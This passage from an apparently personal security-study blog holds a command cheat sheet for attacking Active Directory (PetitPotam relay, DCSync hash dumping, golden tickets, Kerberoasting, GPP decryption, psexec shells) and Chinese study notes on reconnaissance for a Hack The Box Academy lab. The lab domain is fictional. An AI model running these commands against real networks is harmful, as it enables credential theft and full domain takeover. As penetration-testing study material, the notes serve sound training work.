DomainController</code></td><td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td></tr><tr><td><code>git clone https://github.com/topotam/PetitPotam.git</code></td><td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td>Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td></tr><tr><td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td><td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>klist</code></td><td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td></tr><tr><td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator &quot;ACADEMY-EA-DC01$&quot;@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td><td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td><td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td><td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module .\SecurityAssessment.ps1</code></td><td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td><td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td><td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td></tr><tr><td><code>Get-DomainUser * | Select-Object samaccountname,description </code></td><td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></td><td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Group-Policy-Enumeration-amp-Attacks"><a href="#Group-Policy-Enumeration-amp-Attacks" class="headerlink" title="Group Policy Enumeration &amp; Attacks"></a>Group Policy Enumeration &amp; Attacks</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb -L | grep gpp</code></td><td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td></tr><tr><td><code>Get-DomainGPO | select displayname</code></td><td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-GPO -All | Select DisplayName</code></td><td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td></tr><tr><td><code>$sid=Convert-NameToSid &quot;Domain Users&quot; </code></td><td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO | Get-ObjectAcl | ?&#123;$_.SecurityIdentifier -eq $sid</code></td><td>PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td></tr><tr><td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></td><td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </code></td><td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td></tr><tr><td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></td><td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don’t require Kerberos pre-authentication. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Trust-Relationships-Child-gt-Parent-Trusts"><a href="#Trust-Relationships-Child-gt-Parent-Trusts" class="headerlink" title="Trust Relationships - Child &gt; Parent Trusts"></a>Trust Relationships - Child &gt; Parent Trusts</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module activedirectory</code></td><td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust </code></td><td>PowerView tool used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></td><td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td>Uses Mimikatz to obtain the <code>KRBTGT</code> account’s <code>NT Hash</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainSID</code></td><td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</code></td><td>PowerView tool used to obtain the <code>Enterprise Admins</code> group’s SID from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td><td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td></tr><tr><td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td><td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td></tr><tr><td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </code></td><td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;</code></td><td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</code></td><td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group’s <code>RID</code> from a Linux-based host.</td></tr><tr><td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td><td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td></tr><tr><td><code>export KRB5CCNAME=hacker.ccache</code></td><td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td></tr><tr><td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td></tr><tr><td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td></tr></tbody></table><h1 id="Trust-Relationships-Cross-Forest"><a href="#Trust-Relationships-Cross-Forest" class="headerlink" title="Trust Relationships - Cross-Forest"></a>Trust Relationships - Cross-Forest</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></td><td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</code></td><td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td></tr><tr><td><code> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td></tr><tr><td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td></tr><tr><td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>zip -r ilfreight_bh.zip *.json</code></td><td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Initial-Enumeration&quot;&gt;&lt;a href=&quot;#Initial-Enumeration&quot; class=&quot;headerlink&quot; title=&quot;Initial Enumeration&quot;&gt;&lt;/a&gt;Initial Enumeration&lt;/h1&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="cheat_sheet" scheme="https://taninluv.github.io/tags/cheat-sheet/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD</title>
    <link href="https://taninluv.github.io/2023/09/23/AD/"/>
    <id>https://taninluv.github.io/2023/09/23/AD/</id>
    <published>2023-09-23T03:54:00.000Z</published>
    <updated>2023-09-24T08:05:38.149Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniffing out a Foothold</li><li>Initial Enumeration</li><li>Sniffing out a Foothold</li></ul><span id="more"></span><h3 id="External-Information-Gathering-Passive-Checks"><a href="#External-Information-Gathering-Passive-Checks" class="headerlink" title="External Information Gathering (Passive Checks)"></a>External Information Gathering (Passive Checks)</h3><p>外部信息收集被授权证明与可以从互联网上收集的有关公司的信息相关的风险。</p><h3 id="Internal-Testing"><a href="#Internal-Testing" class="headerlink" title="Internal Testing"></a>Internal Testing</h3><p>内部评估部分旨在通过尝试模拟Inlanefreight运营区域内的攻击向量来证明与内部主机和服务（特别是Active Directory）上的漏洞相关的风险。这一结果将使Inlanefright能够评估内部漏洞的风险以及成功利用漏洞的潜在影响。 </p><h3 id="Password-Testing"><a href="#Password-Testing" class="headerlink" title="Password Testing"></a>Password Testing</h3><p>从Inlanefreight设备捕获或由组织提供的密码文件可以加载到离线工作站上进行解密，并用于获得进一步的访问权限和实现评估目标。</p><h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><h2 id="What-Are-We-Looking-For"><a href="#What-Are-We-Looking-For" class="headerlink" title="What Are We Looking For?"></a>What Are We Looking For?</h2><p>在进行外部侦察时，我们应该寻找几个关键项目。这些信息可能并不总是公开的，但谨慎的做法是看看有什么。如果我们在渗透测试中陷入困境，回顾通过被动侦察可以获得的信息可以给我们前进所需的推动力，例如可以用于访问VPN或其他面向外部的服务的密码泄露数据。下表强调了我们在参与的这一阶段将寻找的“内容”。</p><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>IP Space</code></td><td>Valid ASN for our target, netblocks in use for the organization’s public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.</td></tr><tr><td><code>Domain Information</code></td><td>Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS&#x2F;IDS in use, etc.)</td></tr><tr><td><code>Schema Format</code></td><td>Can we discover the organization’s email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.</td></tr><tr><td><code>Data Disclosures</code></td><td>For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain <code>intranet</code> site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)</td></tr><tr><td><code>Breach Data</code></td><td>Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.</td></tr></tbody></table><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS是验证我们的范围并了解客户在其范围界定文档中未披露的可访问主机的好方法。像 <a href="https://whois.domaintools.com/">domaintools</a>,和 <a href="https://viewdns.info/">viewdns.info</a>这样的网站是很好的起点。我们可以取回许多记录和其他数据，从DNS解析到DNSSEC测试，以及该网站是否可以在更受限制的国家&#x2F;地区访问。有时我们可能会发现超出范围的其他主机，但看起来很有趣。在这种情况下，我们可以将此列表带给我们的客户，看看是否确实应该将其中任何一个包含在范围内。我们可能还会发现一些有趣的子域，它们没有在范围界定文档中列出，但位于范围内的IP地址上，因此是公平的。</p><h3 id="Public-Data"><a href="#Public-Data" class="headerlink" title="Public Data"></a>Public Data</h3><p>社交媒体可能是一个有趣数据的宝库，这些数据可以为我们提供组织结构、运营何种设备、潜在的软件和安全实施、架构等方面的线索。排名第一的是与工作相关的网站，如LinkedIn、Indeed.com和Glassdoor。简单的招聘信息往往能揭示一家公司的很多情况。</p><p>现在让我们尝试另一种方法来验证结果中的两个名称服务器。</p><pre><code class="shell-session">[!bash!]$ nslookup ns1.inlanefreight.comServer:192.168.186.1Address:192.168.186.1#53Non-authoritative answer:Name:ns1.inlanefreight.comAddress: 178.128.39.165nslookup ns2.inlanefreight.comServer:192.168.86.1Address:192.168.86.1#53Non-authoritative answer:Name:ns2.inlanefreight.comAddress: 206.189.119.186 </code></pre><p><code>#53</code>是指DNS查询的默认端口</p><p>我们现在有两个新的IP地址要添加到我们的列表中进行验证和测试。在对他们采取任何进一步行动之前，请确保他们在您的测试范围内。出于我们的目的，实际的IP地址不在扫描范围内，但我们可以被动地浏览任何网站来寻找有趣的数据。目前，这就是从DNS中枚举域信息的方法。让我们来看看公开的信息。 Inlanefreight是一家虚构的公司，我们正在使用该模块，因此没有真正的社交媒体存在。然而，如果它是真实的，我们会查看LinkedIn、Twitter、Instagram和Facebook等网站，以获取有用的信息。相反，我们将继续查看inlanefreight.com网站。 我们进行的第一次检查是查找任何文档。使用filetype:pdf-inurl:inlanefreight.com作为搜索，我们正在寻找pdf。</p><h4 id="Hunting-For-Files"><a href="#Hunting-For-Files" class="headerlink" title="Hunting For Files"></a>Hunting For Files</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/google-dorks.png" alt="image"></p><p>弹出了一个文档，所以我们需要确保记下该文档及其位置，并在本地下载一份副本进行挖掘。当我们遇到或生成文件时，最好保存文件、屏幕截图、扫描输出、工具输出等。这有助于我们保持尽可能全面的记录，而不会忘记我们在哪里看到的东西或丢失关键数据。接下来，让我们查找我们能找到的任何电子邮件地址。</p><h4 id="Hunting-E-mail-Addresses"><a href="#Hunting-E-mail-Addresses" class="headerlink" title="Hunting E-mail Addresses"></a>Hunting E-mail Addresses</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231609116.png" alt="image"></p><p>使用dork</p><p> intext：“@inlanefreight.com”inurl:inlanefreightcom，我们正在寻找任何与网站上电子邮件地址结尾相似的实例。一个很有希望的结果出现了一个联系人页面。当我们查看页面（如下图所示）时，我们可以看到一个庞大的员工列表和他们的联系信息。这些信息可能会有所帮助，因为我们可以确定这些人至少很可能是活跃的，并且仍在公司工作。</p><h4 id="E-mail-Dork-Results"><a href="#E-mail-Dork-Results" class="headerlink" title="E-mail Dork Results"></a>E-mail Dork Results</h4><p>浏览联系人页面 <a href="https://www.inlanefreight.com/index.php/contact/">contact page</a>，我们可以看到全球不同办公室员工的几封电子邮件。我们现在已经了解了他们的电子邮件命名约定（first.last）以及一些人在组织中的工作地点。这可能在以后的密码喷射攻击中很方便，或者如果社会工程&#x2F;网络钓鱼是我们参与范围的一部分。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231611087.png" alt="image-20230923161131052"></p><h4 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h4><p>我们可以使用 <a href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的LinkedIn页面中抓取数据，并创建各种用户名的混搭（flast、first.last、f.last等），这些用户名可以添加到我们的潜在密码喷洒目标列表中。</p><h4 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h4><p><a href="http://dehashed.com/">Dehashed</a> </p><p>凭证搜寻 Dehashed是一个很好的工具，可以在漏洞数据中查找明文凭据和密码哈希。我们可以在网站上搜索，也可以使用通过API执行查询的脚本。通常，我们会为那些不在使用AD auth（或内部）的面向外部的门户网站上工作的用户找到许多旧密码，但我们可能会很幸运！这是另一个可用于创建外部或内部密码喷涂用户列表的工具。 注：出于我们的目的，下面的示例数据是虚构的。</p><h1 id="Initial-Enumeration-of-the-Domain"><a href="#Initial-Enumeration-of-the-Domain" class="headerlink" title="Initial Enumeration of the Domain"></a>Initial Enumeration of the Domain</h1><p>以下是我们此时应该寻找的一些关键数据点，并记在我们选择的笔记工具中，并尽可能将扫描&#x2F;工具输出保存到文件中。</p><h4 id="Key-Data-Points"><a href="#Key-Data-Points" class="headerlink" title="Key Data Points"></a>Key Data Points</h4><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>AD Users</code></td><td>We are trying to enumerate valid user accounts we can target for password spraying.</td></tr><tr><td><code>AD Joined Computers</code></td><td>Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.</td></tr><tr><td><code>Key Services</code></td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr><tr><td><code>Vulnerable Hosts and Services</code></td><td>Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)</td></tr></tbody></table><h2 id="TTPs"><a href="#TTPs" class="headerlink" title="TTPs"></a>TTPs</h2><h3 id="Identifying-Hosts"><a href="#Identifying-Hosts" class="headerlink" title="Identifying Hosts"></a>Identifying Hosts</h3><p>花点时间侦听网络，看看发生了什么。我们可以使用Wireshark和TCPDump来“密切关注”网络，看看我们可以捕获哪些主机和类型的网络流量。如果评估方法是“黑匣子”，这尤其有用。我们注意到一些ARP请求和回复、MDNS和其他基本的第二层数据包（由于我们在交换网络上，我们仅限于当前的广播域），其中一些我们可以在下面看到。这是一个很好的开始，它为我们提供了一些关于客户网络设置的信息。</p><h4 id="Start-Wireshark-on-ea-attack01"><a href="#Start-Wireshark-on-ea-attack01" class="headerlink" title="Start Wireshark on ea-attack01"></a>Start Wireshark on ea-attack01</h4><pre><code class="shell-session"> $sudo -E wireshark</code></pre><p>使用<code>sudo -E</code>的主要目的是允许在切换用户的同时继续使用原始用户的环境配置。这在某些情况下非常有用，特别是当你需要使用原始用户的路径、别名、设置或其他环境变量来运行特定命令时。</p><p>如果我们在没有GUI的主机上（这是典型的），我们可以使用tcpdump、netcreds和NetMiner等来执行相同的功能。我们还可以使用tcpdump将捕获保存到.pcap文件，将其传输到另一个主机，然后在Wireshark中打开它。</p><pre><code class="shell-session">sudo tcpdump -i ens224 </code></pre><p>Responder是一种用于侦听、分析和毒害LLMNR、NBT-NS和MDNS请求和响应的工具。它有更多的功能，但目前，我们所使用的只是处于分析模式的工具。这将被动地侦听网络，而不会发送任何中毒的数据包。我们将在后面的章节中更深入地介绍这个工具。</p><h4 id="Starting-Responder"><a href="#Starting-Responder" class="headerlink" title="Starting Responder"></a>Starting Responder</h4><pre><code class="bash">sudo responder -I ens224 -A </code></pre><h4 id="FPing-Active-Checks"><a href="#FPing-Active-Checks" class="headerlink" title="FPing Active Checks"></a>FPing Active Checks</h4><p><a href="https://fping.org/">Fping</a> </p><p>在这里，我们将从几个标志开始fping：a显示活动的目标，s在扫描结束时打印统计数据，g从CIDR网络生成目标列表，q不显示每个目标的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ fping -asgq 172.16.5.0/23172.16.5.5172.16.5.25172.16.5.50172.16.5.100172.16.5.125172.16.5.200172.16.5.225172.16.5.238172.16.5.240     510 targets       9 alive     501 unreachable       0 unknown addresses    2004 timeouts (waiting for response)    2013 ICMP Echos sent       9 ICMP Echo Replies received    2004 other ICMP received 0.029 ms (min round trip time) 0.396 ms (avg round trip time) 0.799 ms (max round trip time)       15.366 sec (elapsed real time)</code></pre><h4 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h4><p>现在我们有了网络中活动主机的列表，我们可以进一步枚举这些主机。我们希望确定每个主机正在运行的服务，确定域控制器和web服务器等关键主机，并确定以后要探测的潜在易受攻击的主机。随着我们对AD的关注，在进行了广泛的扫描后，我们最好关注通常伴随AD服务出现的标准协议，如DNS、SMB、LDAP和Kerberos等。下面是一个简单的Nmap扫描的快速示例。</p><pre><code class="bash">sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum</code></pre><ul><li><code>-v</code>: 启用详细输出，显示更多的信息。</li><li><code>-A</code>: 启用操作系统检测、版本检测、脚本扫描等一系列高级扫描技术。</li><li><code>-iL hosts.txt</code>: 从名为<code>hosts.txt</code>的文件中读取主机列表进行扫描。<code>hosts.txt</code>应该是一个包含要扫描的主机IP地址或主机名的文本文件。</li><li><code>-oN /home/htb-student/Documents/host-enum</code>: 将扫描结果以正常格式保存到<code>/home/htb-student/Documents/host-enum</code>文件中。</li></ul><h4 id="NMAP-Result-Highlights"><a href="#NMAP-Result-Highlights" class="headerlink" title="NMAP Result Highlights"></a>NMAP Result Highlights</h4><pre><code class="shell-session">Nmap scan report for inlanefreight.local (172.16.5.5)Host is up (0.069s latency).Not shown: 987 closed tcp ports (conn-refused)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL| Issuer: commonName=INLANEFREIGHT-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-03-30T22:40:24| Not valid after:  2023-03-30T22:40:24| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)&lt;SNIP&gt;  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: INLANEFREIGHT|   NetBIOS_Domain_Name: INLANEFREIGHT|   NetBIOS_Computer_Name: ACADEMY-EA-DC01|   DNS_Domain_Name: INLANEFREIGHT.LOCAL|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL|   DNS_Tree_Name: INLANEFREIGHT.LOCAL|   Product_Version: 10.0.17763|_  System_Time: 2022-04-04T15:12:45+00:00&lt;SNIP&gt;5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>我们的扫描为我们提供了NetBIOS和DNS使用的命名标准，我们可以看到一些主机打开了RDP，它们为我们指明了INLANEFREIGHT的主域控制器的方向。LOCAL域（ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL）。</p><h2 id="Identifying-Users"><a href="#Identifying-Users" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><h2 id="Identifying-Users-1"><a href="#Identifying-Users-1" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a> 